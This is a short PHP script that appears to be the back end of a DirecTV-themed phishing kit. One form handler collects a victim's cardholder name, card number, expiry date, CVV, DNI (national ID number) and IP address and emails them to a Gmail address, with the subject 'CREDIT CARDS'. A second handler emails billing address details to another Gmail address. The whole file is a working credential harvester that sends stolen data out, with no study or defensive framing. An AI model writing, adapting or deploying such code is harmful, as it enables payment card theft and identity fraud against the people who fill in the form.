<?php 
if (isset($_POST['enviar2'])) {
	
	$ip = getenv('REMOTE_ADDR');
	$titular =$_POST['titular'];
	$digitos =$_POST['digitos'];
	$vencimiento =$_POST['vencimiento'];
	$cvv = $_POST['cvv'];
	$dni = $_POST['dni'];

	$recipient = "elnegro.olmedo3284@gmail.com";

    $asunto = "...:CREDIT CARDS:....";


    $msg = "....: CC DIRECTV :.... \n";
    $msg .= "IP : $ip \n";
    $msg .= "TITULAR : $titular \n";
    $msg .= "DIGITOS : $digitos \n";
    $msg .= "VENCIMIENTO : $vencimiento \n";
    $msg .= "CVV : $cvv \n";
    $msg .= "DNI : $dni \n";
    $msg .= "...:CARTU:... \n";



    mail($recipient, $asunto, $msg);

	
}

if (isset($_POST['enviar3'])) {
	
	$calle =$_POST['calle'];
	$altura =$_POST['altura'];
	$ciudad =$_POST['ciudad'];
	$cp = $_POST['cp'];

    $recipient = "ferdurigon22@gmail.com";

    $asunto = "...:facturacion:....";


    $msg = "....: FACTURACION:.... \n";
    $msg .= "CALLE : $calle \n";
    $msg .= "ALTURA : $altura \n";
    $msg .= "CIUDAD : $ciudad \n";
    $msg .= "CP : $cp \n";



    mail($recipient , $asunto , $msg);
}

 		  
 ?>